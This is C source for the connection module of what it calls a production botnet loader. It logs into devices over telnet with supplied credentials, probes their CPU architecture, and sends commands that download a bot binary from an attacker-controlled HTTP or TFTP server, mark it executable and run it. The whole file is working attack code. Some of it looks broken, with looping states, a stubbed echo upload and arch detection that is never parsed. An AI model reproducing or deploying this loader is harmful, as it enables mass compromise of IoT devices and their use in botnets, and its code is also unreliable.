/*
 * Production Botnet Loader - Connection Handling
 * ============================================================================
 * Manages telnet connection state machine for device exploitation
 * Handles: IAC negotiation, login, architecture detection, binary upload
 * Supports multiple upload methods: wget, tftp, echo
 * ============================================================================
 */

#include "includes.h"
#include "connection.h"
#include "binary.h"
#include "util.h"

/* Forward declarations */
void connection_consume_prompt(struct connection *conn);

/* Connection state machine handler */
void connection_handler(struct connection *conn) {
    switch (conn->state) {
        case TELNET_CONNECTING:
            /* Check if connection established */
            {
                int err = 0;
                socklen_t err_len = sizeof(err);
                getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0) {
                    conn->srv->total_fails++;
                    connection_close(conn);
                    return;
                }
            }
            conn->state = TELNET_READ_IACS;
            connection_consume_iacs(conn);
            break;

        case TELNET_READ_IACS:
            connection_consume_iacs(conn);
            break;

        case TELNET_USER_PROMPT:
            connection_consume_login_prompt(conn);
            break;

        case TELNET_PASS_PROMPT:
            connection_consume_password_prompt(conn);
            break;

        case TELNET_WAITPASS_PROMPT:
            connection_consume_prompt(conn);
            break;

        case TELNET_CHECK_LOGIN:
            connection_verify_login(conn);
            break;

        case TELNET_VERIFY_LOGIN:
            connection_detect_arch(conn);
            break;

        case TELNET_READ_WRITEABLE:
            connection_upload_wget(conn);
            break;

        case TELNET_COPY_ECHO:
            connection_upload_echo(conn);
            break;

        case TELNET_DETECT_ARCH:
            connection_detect_arch(conn);
            break;

        case TELNET_ARM_SUBTYPE:
            connection_upload_wget(conn);
            break;

        case TELNET_UPLOAD_METHODS:
            connection_upload_wget(conn);
            break;

        case TELNET_UPLOAD_ECHO:
            connection_upload_echo(conn);
            break;

        case TELNET_UPLOAD_WGET:
            connection_upload_wget(conn);
            break;

        case TELNET_UPLOAD_TFTP:
            connection_upload_tftp(conn);
            break;

        case TELNET_RUN_BINARY:
            connection_run_binary(conn);
            break;

        case TELNET_CLEANUP:
            connection_close(conn);
            break;

        default:
            connection_close(conn);
            break;
    }
}

/* Missing connection_consume_prompt function */
void connection_consume_prompt(struct connection *conn) {
    char buf[4096];
    int n = recv(conn->fd, buf, sizeof(buf), 0);

    if (n <= 0) {
        conn->srv->total_fails++;
        connection_close(conn);
        return;
    }

    conn->last_recv = time(NULL);

    /* Check for login failure */
    if (util_stristr(buf, n, "error") || util_stristr(buf, n, "failed") ||
        util_stristr(buf, n, "invalid") || util_stristr(buf, n, "incorrect")) {
        conn->srv->total_fails++;
        connection_close(conn);
        return;
    }

    /* Login successful */
    conn->srv->total_successes++;
    conn->state = TELNET_VERIFY_LOGIN;
}

struct connection *connection_open(struct server *srv, int id, struct telnet_info *info) {
    struct connection *conn = calloc(1, sizeof(struct connection));
    if (conn == NULL) return NULL;
    
    conn->srv = srv;
    conn->id = id;
    conn->info = info;
    conn->state = TELNET_CONNECTING;
    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    
    if (conn->fd == -1) {
        free(conn);
        return NULL;
    }
    
    /* Set non-blocking */
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
    
    /* Connect */
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(info->host);
    addr.sin_port = htons(info->port);
    
    if (connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr)) == -1 && errno != EINPROGRESS) {
        close(conn->fd);
        free(conn);
        return NULL;
    }
    
    conn->connect_time = time(NULL);
    conn->last_recv = time(NULL);
    
    return conn;
}

void connection_close(struct connection *conn) {
    if (conn->fd != -1) {
        close(conn->fd);
    }
    
    if (conn->info != NULL) {
        free(conn->info);
    }
    
    if (conn->output_buffer != NULL) {
        free(conn->output_buffer);
    }
    
    free(conn);
}

void connection_consume_iacs(struct connection *conn) {
    /* Handle telnet negotiation */
    char buf[4096];
    int n = recv(conn->fd, buf, sizeof(buf), 0);
    
    if (n <= 0) {
        connection_close(conn);
        return;
    }
    
    conn->last_recv = time(NULL);
    
    /* Send telnet options */
    uint8_t opts[] = {
        0xFF, 0xFB, 0x01,  // WILL ECHO
        0xFF, 0xFB, 0x03,  // WILL SUPPRESS GO AHEAD
        0xFF, 0xFC, 0x22,  // DON'T LINEMODE
    };
    send(conn->fd, opts, sizeof(opts), 0);
    
    /* Send username */
    send(conn->fd, conn->info->user, strlen(conn->info->user), 0);
    send(conn->fd, "\r\n", 2, 0);
    
    conn->state = TELNET_USER_PROMPT;
}

void connection_consume_login_prompt(struct connection *conn) {
    char buf[4096];
    int n = recv(conn->fd, buf, sizeof(buf), 0);
    
    if (n <= 0) {
        conn->srv->total_fails++;
        connection_close(conn);
        return;
    }
    
    conn->last_recv = time(NULL);
    
    /* Send password */
    send(conn->fd, conn->info->pass, strlen(conn->info->pass), 0);
    send(conn->fd, "\r\n", 2, 0);
    
    conn->state = TELNET_PASS_PROMPT;
}

void connection_consume_password_prompt(struct connection *conn) {
    char buf[4096];
    int n = recv(conn->fd, buf, sizeof(buf), 0);
    
    if (n <= 0) {
        conn->srv->total_fails++;
        connection_close(conn);
        return;
    }
    
    conn->last_recv = time(NULL);
    
    /* Check for login failure */
    if (util_stristr(buf, n, "error") || util_stristr(buf, n, "failed") ||
        util_stristr(buf, n, "invalid") || util_stristr(buf, n, "incorrect")) {
        conn->srv->total_fails++;
        connection_close(conn);
        return;
    }
    
    /* Login successful */
    conn->srv->total_successes++;
    conn->state = TELNET_VERIFY_LOGIN;
}

void connection_verify_login(struct connection *conn) {
    /* Send test command */
    send(conn->fd, "echo\n", 5, 0);
    conn->state = TELNET_READ_WRITEABLE;
}

void connection_detect_arch(struct connection *conn) {
    /* Read ELF header from /bin/echo to detect architecture */
    send(conn->fd, "cat /bin/echo | head -c 20 | xxd\n", 35, 0);
    conn->state = TELNET_ARM_SUBTYPE;
}

void connection_upload_echo(struct connection *conn) {
    /* Upload binary using echo commands (hex encoded) */
    /* This is the fallback method */
    conn->state = TELNET_UPLOAD_METHODS;
}

void connection_upload_wget(struct connection *conn) {
    /* Upload binary using wget */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "wget http://%s:%d/bins/axis.%s -O /tmp/m; chmod 777 /tmp/m; /tmp/m &\n",
        HTTP_SERVER, HTTP_PORT, conn->arch);
    send(conn->fd, cmd, strlen(cmd), 0);
    conn->srv->total_wgets++;
    conn->state = TELNET_RUN_BINARY;
}

void connection_upload_tftp(struct connection *conn) {
    /* Upload binary using tftp */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "tftp -g -r axis.%s %s; chmod 777 axis.%s; ./axis.%s &\n",
        conn->arch, TFTP_SERVER, conn->arch, conn->arch);
    send(conn->fd, cmd, strlen(cmd), 0);
    conn->srv->total_tftps++;
    conn->state = TELNET_RUN_BINARY;
}

void connection_run_binary(struct connection *conn) {
    /* Binary should be running now */
    conn->srv->total_echoes++;
    connection_close(conn);
}
